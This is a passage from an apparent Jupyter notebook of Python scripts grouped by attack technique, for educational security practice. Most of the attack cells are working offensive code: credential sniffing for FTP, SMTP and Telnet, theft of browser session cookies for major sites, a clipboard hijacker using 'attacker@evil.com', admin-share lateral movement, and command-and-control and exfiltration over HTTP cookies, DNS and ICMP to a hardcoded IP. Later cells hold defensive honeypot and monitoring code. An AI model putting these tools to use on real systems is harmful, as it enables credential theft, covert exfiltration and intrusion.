        "        if re.search(emailregex,decoded):\n",
        "            print(\"%s SMTP Username: %s\" % (packet[IP].dst,decoded))\n",
        "            unmatched.append([packet[IP].src,packet[TCP].sport])\n",
        "        elif connData in unmatched:\n",
        "                print(\"%s SMTP Password: %s\" % (packet[IP].dst,decoded))\n",
        "                unmatched.remove(connData)\n",
        "            \n",
        "    except:\n",
        "        return\n",
        "\n",
        "awaitingLogin = []\n",
        "awaitingPassword = []\n",
        "def ExtractTelnet(packet):\n",
        "    \n",
        "    try:\n",
        "        payload = packet[Raw].load.decode(\"utf-8\").rstrip()\n",
        "    except:\n",
        "        return\n",
        "    connData = [packet[IP].src,packet[TCP].sport] # Assume server is source\n",
        "    if payload[:5] == \"login\":\n",
        "        awaitingLogin.append(connData)\n",
        "        return\n",
        "    elif payload[:8] == \"Password\":\n",
        "        awaitingPassword.append(connData)\n",
        "        return\n",
        "    connData = [packet[IP].dst,packet[TCP].dport] # Assume client is source\n",
        "    if connData in awaitingLogin:\n",
        "        print(\"%s Telnet Username: %s\" % (packet[IP].dst,payload))\n",
        "        awaitingLogin.remove(connData)\n",
        "    elif connData in awaitingPassword:\n",
        "        print(\"%s Telnet Password: %s\" % (packet[IP].dst,payload))\n",
        "        awaitingPassword.remove(connData)\n",
        "\n",
        "packets = rdpcap(\"merged.pcap\")\n",
        "\n",
        "for packet in packets:\n",
        "    if packet.haslayer(TCP) and packet.haslayer(Raw):\n",
        "        if packet[TCP].dport == 21:\n",
        "            ExtractFTP(packet)\n",
        "        elif packet[TCP].dport == 25:\n",
        "            ExtractSMTP(packet)\n",
        "        elif packet[TCP].sport == 23 or packet[TCP].dport == 23:\n",
        "            ExtractTelnet(packet)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BoAWvGfzpR9M"
      },
      "source": [
        "# Part_9"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "YYV-Qi40pk5D"
      },
      "outputs": [],
      "source": [
        "#User_Account_Discovery\n",
        "\n",
        "import os,wmi\n",
        "\n",
        "w = wmi.WMI()\n",
        "\n",
        "# Get list of Administrator Accounts\n",
        "admins = None\n",
        "for group in w.Win32_Group():\n",
        "    if group.Name == \"Administrators\":\n",
        "        admins = [a.Name for a in group.associators(wmi_result_class=\"Win32_UserAccount\")]\n",
        "\n",
        "# List user accounts on device\n",
        "for user in w.Win32_UserAccount():\n",
        "    print(\"Username: %s\" % user.Name)\n",
        "    print(\"Administrator: %s\" % (user.Name in admins))\n",
        "    print(\"Disabled: %s\" % user.Disabled)\n",
        "    print(\"Local: %s\" % user.LocalAccount)\n",
        "    print(\"Password Changeable: %s\"%user.PasswordChangeable)\n",
        "    print(\"Password Expires: %s\" % user.PasswordExpires)\n",
        "    print(\"Password Required: %s\" % user.PasswordRequired)\n",
        "    print(\"\\n\")\n",
        "\n",
        "# Print Windows Password Policy\n",
        "print(\"Password Policy:\")\n",
        "print(os.system(\"net accounts\"))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ldlRWWhq2wCq"
      },
      "outputs": [],
      "source": [
        "#File_and_Directory_Discovery\n",
        "\n",
        "import os,re\n",
        "from zipfile import ZipFile\n",
        "\n",
        "email_regex = '[a-z0-9]+[\\._]?[a-z0-9]+[@]\\w+[.]\\w{2,3}'\n",
        "phone_regex = '[(]*[0-9]{3}[)]*-[0-9]{3}-[0-9]{4}'\n",
        "ssn_regex = '[0-9]{3}-[0-9]{2}-[0-9]{4}'\n",
        "regexes = [email_regex, phone_regex, ssn_regex]\n",
        "def findPII(data):\n",
        "    matches = []\n",
        "    for regex in regexes:\n",
        "        m = re.findall(regex,data)\n",
        "        matches += m\n",
        "    return matches\n",
        "\n",
        "def printMatches(filedir,matches):\n",
        "    if len(matches) > 0:\n",
        "        print(filedir)\n",
        "        for match in matches:\n",
        "            print(match)\n",
        "    \n",
        "\n",
        "def parseDocx(root,docs):\n",
        "    for doc in docs:\n",
        "        matches = None\n",
        "        filedir = os.path.join(root,doc)\n",
        "        with ZipFile(filedir,\"r\") as zip:\n",
        "            data = zip.read(\"word/document.xml\")\n",
        "            matches = findPII(data.decode(\"utf-8\"))\n",
        "        printMatches(filedir,matches)\n",
        "\n",
        "def parseText(root,txts):\n",
        "    for txt in txts:\n",
        "        filedir = os.path.join(root,txt)\n",
        "        with open(filedir,\"r\") as f:\n",
        "            data = f.read()\n",
        "        matches = findPII(data)\n",
        "        printMatches(filedir,matches)\n",
        "\n",
        "txt_ext = [\".txt\",\".py\",\".csv\"]\n",
        "\n",
        "def findFiles(directory):\n",
        "    for root,dirs,files in os.walk(directory):\n",
        "        parseDocx(root,[f for f in files if f.endswith(\".docx\") ])\n",
        "        for ext in txt_ext:\n",
        "            parseText(root,[f for f in files if f.endswith(ext)])\n",
        "\n",
        "directory = os.path.join(os.getcwd(),\"Documents\")\n",
        "findFiles(directory)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gy58YK6gpTBf"
      },
      "source": [
        "# Part_10"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "uam4EPQApUjH"
      },
      "outputs": [],
      "source": [
        "#Remote_Services\n",
        "import os,winreg,shutil\n",
        "\n",
        "def enableAdminShare(computerName):\n",
        "    regpath = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"\n",
        "    winreg.ConnectRegistry(computerName,winreg.HKEY_LOCAL_MACHINE)\n",
        "    winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)\n",
        "    winreg.SetValueEx(key,\"LocalAccountTokenFilterPolicy\",0,winreg.REG_DWORD,1)\n",
        "    # Reboot needed\n",
        "\n",
        "def accessAdminShare(computerName,executable):\n",
        "    remote = r\"\\\\\"+computerName+\"\\c$\"\n",
        "    local = \"Z:\"\n",
        "    remotefile = local + \"\\\\\"+executable\n",
        "    os.system(\"net use \"+local+\" \"+remote)\n",
        "    shutil.move(executable,remotefile)\n",
        "    os.system(\"python \"+remotefile)\n",
        "    os.system(\"net use \"+local+\" /delete\")\n",
        "    \n",
        "\n",
        "accessAdminShare(os.environ[\"COMPUTERNAME\"],r\"malicious1.py\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Mz6Lnbtj4Smv"
      },
      "outputs": [],
      "source": [
        "#Web_Session_Cookie\n",
        "#сохранение cookie\n",
        "\n",
        "import sqlite3,os\n",
        "\n",
        "profile = \"jpb273b6.default-release\"\n",
        "firefoxPath = os.path.join( \"C:\\\\Users\\\\hepos\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\",profile,\"cookies.sqlite\")\n",
        "\n",
        "conn = sqlite3.connect(firefoxPath)\n",
        "c = conn.cursor()\n",
        "c.execute(\"SELECT * FROM moz_cookies\")\n",
        "\n",
        "data = c.fetchall()\n",
        "\n",
        "\n",
        "# Source: https://embracethered.com/blog/posts/passthecookie/\n",
        "cookies = {\n",
        "    \".amazon.com\": [\"aws-userInfo\", \"aws-creds\"],\n",
        "    \".google.com\": [\"OSID\", \"HSID\", \"SID\", \"SSID\", \"APISID\", \"SAPISID\", \"LSID\"],\n",
        "    \".microsoftonline.com\": [\"ESTSAUTHPERSISTENT\"],\n",
        "    \".facebook.com\": [\"c_user\",\"cs\"],\n",
        "    \".onelogin.com\": [\"sub_session_onelogin.com\"],\n",
        "    \".github.com\": [\"user_session\"],\n",
        "    \".live.com\": [\"RPSSecAuth\"],\n",
        "}\n",
        "for cookie in data:\n",
        "    for domain in cookies:\n",
        "        if cookie[4].endswith(domain) and cookie[2] in cookies[domain]:\n",
        "            print(\"%s %s %s\" % (cookie[4], cookie[2],cookie[3][:20]))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XeQ8RoMOpV5v"
      },
      "source": [
        "# Part_11"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "pmVuhBcJplya"
      },
      "outputs": [],
      "source": [
        "#Clipboard_Data\n",
        "\n",
        "import win32clipboard,re\n",
        "from time import sleep\n",
        "\n",
        "attacker_email = \"attacker@evil.com\"\n",
        "emailregex = '^[a-z0-9]+[\\._]?[a-z0-9]+[@]\\w+[.]\\w{2,3}$'\n",
        "\n",
        "while True:\n",
        "    win32clipboard.OpenClipboard()\n",
        "    data = win32clipboard.GetClipboardData().rstrip()\n",
        "    print(data)\n",
        "    if (re.search(emailregex,data)):\n",
        "        win32clipboard.EmptyClipboard();\n",
        "        win32clipboard.SetClipboardText(attacker_email)\n",
        "        break\n",
        "    win32clipboard.CloseClipboard()\n",
        "    sleep(1)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "sBYj-ZnE4p4M"
      },
      "outputs": [],
      "source": [
        "#Local_Email_Collection\n",
        "# сбор данных о почте\n",
        "\n",
        "from libratom.lib.pff import PffArchive\n",
        "\n",
        "filename = \"C:\\\\Users\\\\hepos\\\\Documents\\\\Outlook Files\\\\howard@howardposton.com.pst\"\n",
        "archive = PffArchive(filename)\n",
        "\n",
        "for folder in archive.folders():\n",
        "    if folder.get_number_of_sub_messages() != 0:\n",
        "        for message in folder.sub_messages:\n",
        "            print(\"Sender: %s\" % message.get_sender_name())\n",
        "            print(\"Subject: %s\" % message.get_subject())\n",
        "            print(\"Message: %s\" % message.get_plain_text_body())"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0wOVyp2ApW6g"
      },
      "source": [
        "# Part_12"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "0oaWNU6Mpmko"
      },
      "outputs": [],
      "source": [
        "#Encrypted_Channel\n",
        "#создание зашифрованного канала\n",
        "\n",
        "import socket, os\n",
        "from Crypto.Cipher import AES\n",
        "\n",
        "host = \"127.0.0.1\"\n",
        "port = 1337\n",
        "\n",
        "key = b\"Sixteen byte key\"\n",
        "\n",
        "def encrypt(data,key,iv):\n",
        "    # Pad data as needed\n",
        "    data += \" \"*(16 - len(data) % 16)\n",
        "\n",
        "    cipher = AES.new(key,AES.MODE_CBC,iv)\n",
        "    return cipher.encrypt(bytes(data,\"utf-8\"))\n",
        "\n",
        "message = \"Hello\"\n",
        "\n",
        "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
        "    s.connect((host,port))\n",
        "    iv = os.urandom(16)\n",
        "    s.send(iv)\n",
        "    s.send(bytes([len(message)]))\n",
        "    encrypted = encrypt(message,key,iv)\n",
        "    print(\"Sending %s\" % encrypted.hex())\n",
        "    s.sendall(encrypted)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "U57xFa4W5VH4"
      },
      "outputs": [],
      "source": [
        "import socket\n",
        "from Crypto.Cipher import AES\n",
        "\n",
        "host = \"127.0.0.1\"\n",
        "port = 1337\n",
        "\n",
        "key = b\"Sixteen byte key\"\n",
        "\n",
        "def decrypt(data,key,iv):\n",
        "    cipher = AES.new(key,AES.MODE_CBC,iv)\n",
        "    return cipher.decrypt(data)\n",
        "\n",
        "with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:\n",
        "    s.bind((host,port))\n",
        "    s.listen()\n",
        "    conn,addr = s.accept()\n",
        "    with conn:\n",
        "        while True:\n",
        "            iv = conn.recv(16)\n",
        "            length = conn.recv(1)   # Assumes short messages\n",
        "            data = conn.recv(1024)\n",
        "            if not data:\n",
        "                break\n",
        "            print(\"Received: %s\"%decrypt(data,key,iv).decode(\"utf-8\")[:ord(length)])"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "gnDRHerL50iA"
      },
      "outputs": [],
      "source": [
        "#Protocol_Tunneling\n",
        "\n",
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n",
        "from base64 import b64decode,b64encode\n",
        "\n",
        "class C2Server(BaseHTTPRequestHandler):\n",
        "    def do_GET(self):\n",
        "        # Parse headers\n",
        "        data = b64decode(self.headers[\"Cookie\"]).decode(\"utf-8\").rstrip()\n",
        "        print(\"Received: %s\"%data)\n",
        "        if data == \"C2 data\":\n",
        "            response = b64encode(bytes(\"Received\",\"utf-8\"))\n",
        "            self.send_response(200)\n",
        "            self.end_headers()\n",
        "            self.wfile.write(response)\n",
        "        else:\n",
        "            self.send_error(404)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    hostname = \"\"\n",
        "    port = 8443\n",
        "    webServer = HTTPServer((hostname,port),C2Server)\n",
        "    try:\n",
        "        webServer.serve_forever()\n",
        "    except KeyboardInterrupt:\n",
        "        pass\n",
        "    webServer.server_close()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8M0ljhRFpYZ7"
      },
      "source": [
        "# Part_13"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "oHJlpkzQpnHO"
      },
      "outputs": [],
      "source": [
        "#Alternative_Protocol\n",
        "from scapy.all import *\n",
        "from base64 import b64encode\n",
        "\n",
        "ip = \"10.10.10.8\"\n",
        "domain = \"google.com\"\n",
        "\n",
        "def process(response):\n",
        "    code = str(response[DNS].an.rdata)[-1]\n",
        "    if int(code) == 1:\n",
        "        print(\"Received successfully\")\n",
        "    elif int(code) == 2:\n",
        "        print(\"Acknowledged end transmission\")\n",
        "    else:\n",
        "        print(\"Transmission error\")\n",
        "\n",
        "def DNSRequest(subdomain):\n",
        "    global domain\n",
        "    d = bytes(subdomain + \".\" + domain,\"utf-8\")\n",
        "    query = DNSQR(qname=d)\n",
        "    mac = get_if_hwaddr(conf.iface)\n",
        "    p = Ether(src=mac,dst=mac)/IP(dst=bytes(ip,\"utf-8\"))/UDP(dport=1337)/DNS(qd=query)\n",
        "    result = srp1(p,verbose=False)\n",
        "    process(result)\n",
        "\n",
        "\n",
        "def sendData(data):\n",
        "    for i in range(0,len(data),10):\n",
        "        chunk = data[i:min(i+10,len(data))]\n",
        "        print(\"Transmitting %s\"%chunk)\n",
        "        encoded = b64encode(bytes(chunk,\"utf-8\"))\n",
        "        print(encoded)\n",
        "        encoded = encoded.decode(\"utf-8\").rstrip(\"=\")\n",
        "        DNSRequest(encoded)\n",
        "\n",
        "data = \"This is data being exfiltrated over DNS\"\n",
        "sendData(data)\n",
        "data = \"R\"\n",
        "sendData(data)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "30mNzQVG6xGf"
      },
      "outputs": [],
      "source": [
        "from scapy.all import *\n",
        "import socket\n",
        "from base64 import b64decode\n",
        "from time import sleep\n",
        "\n",
        "def sendResponse(query,ip):\n",
        "    question = query[DNS].qd\n",
        "    answer = DNSRR(rrname=question.qname,ttl=1000,rdata=ip)\n",
        "    response = Ether(src=query[Ether].dst,dst=query[Ether].src)/IP(src=query[IP].dst,dst=query[IP].src)/UDP(dport=query[UDP].sport,sport=1337)/DNS(id=query[DNS].id,qr=1,qdcount=1,ancount=1,qd=query[DNS].qd,an=answer)\n",
        "    sleep(1)\n",
        "    sendp(response)\n",
        "\n",
        "extracted = \"\"\n",
        "\n",
        "def extractData(x):\n",
        "    global extracted\n",
        "    if x.haslayer(DNS) and x[UDP].dport == 1337:\n",
        "        domain = x[DNS].qd.qname\n",
        "        ind = domain.index(bytes(\".\",\"utf-8\"))\n",
        "        data = domain[:ind]\n",
        "        padnum = (4-(len(data)%4))%4\n",
        "        data += bytes(\"=\"*padnum,\"utf-8\")\n",
        "        try:\n",
        "            decoded = b64decode(data).decode(\"utf-8\")\n",
        "            if decoded == \"R\":\n",
        "                response = sendResponse(x,\"10.0.0.2\")\n",
        "                print(\"End transmission\")\n",
        "                print(extracted)\n",
        "                extracted = \"\"\n",
        "            else:\n",
        "                extracted += decoded\n",
        "                response = sendResponse(x,\"10.0.0.1\")\n",
        "        except Exception as e:\n",
        "            print(e)\n",
        "            response = sendResponse(x,\"10.0.0.0\")\n",
        "\n",
        "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
        "s.bind((\"\",1337))\n",
        "#s.listen(10)\n",
        "\n",
        "sniff(prn=extractData)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XkphTkUCpZ9o"
      },
      "source": [
        "# Part_14"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "JMSHGh7lpnyN"
      },
      "outputs": [],
      "source": [
        "#Non-Application_Layer_Protocol\n",
        "#протокол, не относящийся к прикладному уровню, для связи между хостом и сервером.\n",
        "from scapy.all import *\n",
        "\n",
        "def transmit(message, host):\n",
        "    for m in message:\n",
        "        packet = IP(dst=host)/ICMP(code = ord(m))\n",
        "        send(packet)\n",
        "\n",
        "host = \"3.20.135.129\"\n",
        "message = \"Hello\"\n",
        "transmit(message,host)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "hwnceszb7G-n"
      },
      "outputs": [],
      "source": [
        "from scapy.all import *\n",
        "\n",
        "def printData(x):\n",
        "    d = chr(x[ICMP].code)\n",
        "    print(d,end=\"\",flush=True)\n",
        "\n",
        "sniff(filter=\"icmp\", prn=printData)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "RNxrewV-pbZ2"
      },
      "source": [
        "# Part_15"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "zUhGeB76poiP"
      },
      "outputs": [],
      "source": [
        "#Decoy_Process\n",
        "\n",
        "import signal,sys\n",
        "from time import sleep\n",
        "\n",
        "def terminated(signum,frame):\n",
        "    pass\n",
        "\n",
        "\n",
        "signal.signal(signal.SIGTERM,terminated)\n",
        "signal.signal(signal.SIGINT,terminated)\n",
        "while True:\n",
        "    siginfo = signal.sigwaitinfo({signal.SIGINT,signal.SIGTERM})\n",
        "    with open(\"terminated.txt\",\"w\") as f:\n",
        "        f.write(\"Process terminated by %d\\n\" % siginfo.si_pid)\n",
        "    sys.exit(0)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ipEgVnQ27fdg"
      },
      "outputs": [],
      "source": [
        "#Decoy_Content\n",
        "\n",
        "import pathlib\n",
        "\n",
        "def getTimestamps(filename):\n",
        "    fname = pathlib.Path(filename)\n",
        "    stats = fname.stat()\n",
        "    if not fname.exists(): # File deleted\n",
        "        return []\n",
        "    return(stats.st_ctime,stats.st_mtime,stats.st_atime)\n",
        "    \n",
        "\n",
        "def checkTimestamps(filename,create,modify,access):\n",
        "    stats = getTimestamps(filename)\n",
        "    if len(stats) == 0:\n",
        "        return False # File deleted\n",
        "    (ctime,mtime,atime) = stats\n",
        "    if float(create) != float(ctime):\n",
        "        return False    # File creation time is incorrect\n",
        "    elif float(modify) != float(mtime):\n",
        "        return False    # File modify time is incorrect\n",
        "    elif float(access) != float(atime):\n",
        "        return False    # File access time is incorrect\n",
        "    return True\n",
        "\n",
        "def checkDecoyFiles():\n",
        "    with open(\"decoys.txt\",\"r\") as f:\n",
        "        for line in f:\n",
        "            vals = line.rstrip().split(\",\")\n",
        "            if not checkTimestamps(vals[0],vals[1],vals[2],vals[3]):\n",
        "                print(\"%s has been tampered with.\" % vals[0])\n",
        "\n",
        "checkDecoyFiles()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "1wF3wGXw7mP-"
      },
      "outputs": [],
      "source": [
        "#Decoy_Credentials\n",
        "\n",
        "import asyncio, asyncssh, crypt, sys, time, random\n",
        "\n",
        "def handle_client(process):\n",
        "    process.exit(0)\n",
        "\n",
        "class MySSHServer(asyncssh.SSHServer):\n",
        "    def connection_made(self, conn):\n",
        "        self._conn = conn\n",
        "\n",
        "    def password_auth_supported(self):\n",
        "        return True\n",
        "\n",
        "    def validate_password(self, username, password):\n",
        "        print('Login attempt from %s with username %s and password %s' %\n",
        "                  (self._conn.get_extra_info('peername')[0],username,password))\n",
        "        # Sleep, then disconnect\n",
        "        time.sleep(random.randint(0,5))\n",
        "        raise asyncssh.DisconnectError(10,\"Connection lost\") \n",
        "\n",
        "async def start_server():\n",
        "    await asyncssh.create_server(MySSHServer, '', 8022,\n",
        "                                 server_host_keys=['ssh_host_key'],\n",
        "                                 process_factory=handle_client)\n",
        "\n",
        "loop = asyncio.get_event_loop()\n",
        "\n",
        "try:\n",
        "    loop.run_until_complete(start_server())\n",
        "except (OSError, asyncssh.Error) as exc:\n",
        "    sys.exit('Error starting server: ' + str(exc))\n",
        "\n",
        "loop.run_forever()\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WnJCLd99pc3M"
      },
      "source": [
        "# Part_16"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "8TtGBSoFppEZ"
      },
      "outputs": [],
      "source": [
        "#PCAP_Collection\n",
        "\n",
        "from scapy.all import *\n",
        "\n",
        "decoys = {\n",
        "    \"127.0.0.1\":[443,8443],\n",
        "    \"10.10.10.8\":[443,8443]\n",
        "}\n",
        "\n",
        "def analyzePackets(p):\n",
        "    if p.haslayer(IP):\n",
        "        decoyIP = [ip for ip in [p[IP].src, p[IP].dst] if ip in decoys]\n",
        "        if len(decoyIP) > 0:\n",
        "            ports = None\n",
        "            if p.haslayer(TCP):\n",
        "                ports = [p[TCP].sport,p[TCP].dport]\n",
        "            elif p.haslayer(UDP):\n",
        "                ports = [p[UDP].sport,p[UDP].dport]\n",
        "            decoyPort = [port for port in ports if port in decoys[decoyIP[0]]]\n",
        "            if len(decoyPort) > 0:\n",
        "                wrpcap(\"out.pcap\",p,append=True)\n",
        "\n",
        "sniff(prn=analyzePackets)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "TQyQ4jt88XWh"
      },
      "outputs": [],
      "source": [
        "#ProtocolDecoder\n",
        "\n",
        "from scapy.all import *\n",
        "from scapy.layers.http import *\n",
        "from base64 import b64decode\n",
        "\n",
        "b64regex = b\"[A-Za-z0-9+/=]+\"\n",
        "def extractData(data):    \n",
        "    data = data.rstrip()\n",
        "    matches = re.findall(b64regex,data)\n",
        "    for match in matches:\n",
        "        if len(match) == 0:\n",
        "            continue\n",
        "        try:\n",
        "            if not len(match) % 4 == 0:\n",
        "                padnum = (4-len(match)%4)%4\n",
        "                match += b\"=\" * padnum\n",
        "            decoded = b64decode(match).decode(\"utf-8\")\n",
        "            if len(decoded) > 5 and decoded.isprintable():\n",
        "                print(\"Decoded: %s\"%decoded)\n",
        "        except:\n",
        "            continue\n",
        "\n",
        "def extractHTTP(p):\n",
        "    fields = None\n",
        "    if p.haslayer(HTTPRequest):\n",
        "        fields = p[HTTPRequest].fields\n",
        "    else:\n",
        "        fields = p[HTTPResponse].fields\n",
        "    for f in fields:\n",
        "        data = fields[f]\n",
        "        if isinstance(data,str):\n",
        "            extractData(data)\n",
        "        elif isinstance(data,dict):\n",
        "            for d in data:\n",
        "                extractData(data[d])\n",
        "        elif isinstance(data,list) or isinstance(data,tuple):\n",
        "            for d in data:\n",
        "                extractData(d)\n",
        "\n",
        "def extractRaw(p):\n",
        "    extractData(p[Raw].load)\n",
        "\n",
        "def analyzePackets(p):\n",
        "    if p.haslayer(HTTPRequest) or p.haslayer(HTTPResponse):\n",
        "        p.show()\n",
        "        extractHTTP(p)\n",
        "    elif p.haslayer(Raw):\n",
        "        extractRaw(p)\n",
        "\n",
        "sniff(prn=analyzePackets)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "4XBNFlKQ8nwX"
      },
      "outputs": [],
      "source": [
        "#ProtocolTunnelingClient\n",
        "\n",
        "import requests\n",
        "from base64 import b64encode,b64decode\n",
        "\n",
        "def C2(url,data):\n",
        "    response = requests.get(url,headers={'Cookie': b64encode(data)})\n",
        "    print(b64decode(response.content))\n",
        "\n",
        "url = \"http://3.20.135.129:8443\"\n",
        "data = bytes(\"C2 data\",\"utf-8\")\n",
        "C2(url,data)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "7s4N14XA8uve"
      },
      "outputs": [],
      "source": [
        "#ProtocolTunnelingServer\n",
        "\n",
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n",
        "from base64 import b64decode,b64encode\n",
        "\n",
        "class C2Server(BaseHTTPRequestHandler):\n",
        "    def do_GET(self):\n",
        "        # Parse headers\n",
        "        data = b64decode(self.headers[\"Cookie\"]).decode(\"utf-8\").rstrip()\n",
        "        print(\"Received: %s\"%data)\n",
        "        if data == \"C2 data\":\n",
        "            response = b64encode(bytes(\"Received\",\"utf-8\"))\n",
        "            self.send_response(200)\n",
        "            self.end_headers()\n",
        "            self.wfile.write(response)\n",
        "        else:\n",
        "            self.send_error(404)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    hostname = \"\"\n",
        "    port = 8443\n",
        "    webServer = HTTPServer((hostname,port),C2Server)\n",
        "    try:\n",
        "        webServer.serve_forever()\n",
        "    except KeyboardInterrupt:\n",
        "        pass\n",
        "    webServer.server_close()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "eGginpuf8X7F"
      },
      "outputs": [],
      "source": [
        "#Burn_In\n",
        "# какие сайты открывались\n",
        "import random, requests\n",
        "from time import sleep\n",
        "\n",
        "def makeRequest(url):\n",
        "    _ = requests.get(url)\n",
        "    return\n",
        "\n",
        "\n",
        "def getURL():\n",
        "    return sites[random.randint(0,len(sites)-1)].rstrip()\n",
        "\n",
        "clickthrough = .5\n",
        "sleeptime = 1\n",
        "def browsingSession():\n",
        "    while(random.random() < clickthrough):\n",
        "        url = getURL()\n",
        "        makeRequest(url)\n",
        "        sleep(random.randint(0,sleeptime))\n",
        "        \n",
        "f = open(\"sites.txt\",\"r\")\n",
        "sites = f.readlines()\n",
        "\n",
        "browsingSession()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "u2ChtxpGpeTy"
      },
      "source": [
        "# Part_17"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "PK8Rp5URpqCi"
      },
      "outputs": [],
      "source": [
        "#Network_Monitoring\n",
        "# мониторинг сети\n",
        "from scapy.all import *\n",
        "\n",
        "flowData = {}\n",
        "def analyzeFlow(p):\n",
        "    if p.haslayer(IP):\n",
        "        length = p[IP].len\n",
        "    else:\n",
        "        return\n",
        "    key = None\n",
        "    data = None\n",
        "    if p[IP].src < p[IP].dst:\n",
        "        key = ','.join([p[IP].src,p[IP].dst])\n",
        "        data = [length,0]\n",
        "    else:\n",
        "        key = ','.join([p[IP].dst,p[IP].src])\n",
        "        data = [0,length]\n",
        "    if key in flowData:\n",
        "        f = flowData[key]\n",
        "        flowData[key] = [f[0]+data[0],f[1]+data[1]]\n",
        "    else:\n",
        "        flowData[key] = data\n",
        "\n",
        "packets = rdpcap(\"http.cap\")\n",
        "for p in packets:\n",
        "    analyzeFlow(p)\n",
        "\n",
        "for f in flowData:\n",
        "    [src,dst] = f.split(\",\")\n",
        "    d = flowData[f]\n",
        "    print(\"%d bytes %s->%s\\t%d bytes %s->%s\" % (d[0],src,dst,d[1],dst,src))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "Qze9QY09-d3p"
      },
      "outputs": [],
      "source": [
        "#SystemActivityMonitoring\n",
        "# систеа мониторинга\n",
        "import win32evtlog\n",
        "\n",
        "server = \"localhost\"\n",
        "logtype = \"Security\"\n",
        "flags = win32evtlog.EVENTLOG_FORWARDS_READ|win32evtlog.EVENTLOG_SEQUENTIAL_READ\n",
        "\n",
        "failures = {}\n",
        "\n",
        "def checkEvents():\n",
        "    h = win32evtlog.OpenEventLog(server,logtype)\n",
        "    while True:\n",
        "        events = win32evtlog.ReadEventLog(h,flags,0)\n",
        "        if events:\n",
        "            for event in events:\n",
        "                if event.EventID == 4625:\n",
        "                    if event.StringInserts[0].startswith(\"S-1-5-21\"):\n",
        "                        account = event.StringInserts[1]\n",
        "                        if account in failures:\n",
        "                            failures[account] += 1\n",
        "                        else:\n",
        "                            failures[account] = 1\n",
        "        else:\n",
        "            break\n",
        "\n",
        "checkEvents()\n",
        "\n",
        "for account in failures:\n",
        "    print(\"%s: %s failed logins\" % (account,failures[account]))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "uxsLt1nC-n2r"
      },
      "outputs": [],
      "source": [
        "#Behavioral_Analytics\n",
        "# анализ поведения\n",
        "\n",
        "import psutil\n",
        "\n",
        "conn_counts = {}\n",
        "totalConns = 0\n",
        "\n",
        "def buildBaseline():\n",
        "    for p in psutil.pids():\n",
        "        proc = psutil.Process(p)\n",
        "        name = proc.name()\n",
        "        hasConns = int(len(proc.connections()) > 0)\n",
        "        if name in conn_counts:\n",
        "            (connected,total) = conn_counts[name]\n",
        "            conn_counts[name] = (connected+hasConns,total+1)\n",
        "        else:\n",
        "            conn_counts[name] = (hasConns,1)\n",
        "\n",
        "threshold = .5\n",
        "def checkConnections():\n",
        "    for p in psutil.pids():\n",
        "        proc = psutil.Process(p)\n",
        "        name = proc.name()\n",
        "        hasConns = len(proc.connections()) > 0\n",
        "        if hasConns:\n",
        "            if name in conn_counts:\n",
        "                (connected,total) = conn_counts[name]\n",
        "                prob = connected/total\n",
        "                if prob < threshold:\n",
        "                    print(\"Process %s has network connection at %f probability\" % (name,prob))\n",
        "            else:\n",
        "                print(\"New process %s has network connection\" % name)\n",
        "        else:\n",
        "            if name in conn_counts:\n",
        "                (connected,total) = conn_counts[name]\n",
        "                prob = 1-(connected/total)\n",
        "                if prob < threshold:\n",
        "                    print(\"Process %s doesn't have network connection at %f probability\" % (name, prob))\n",
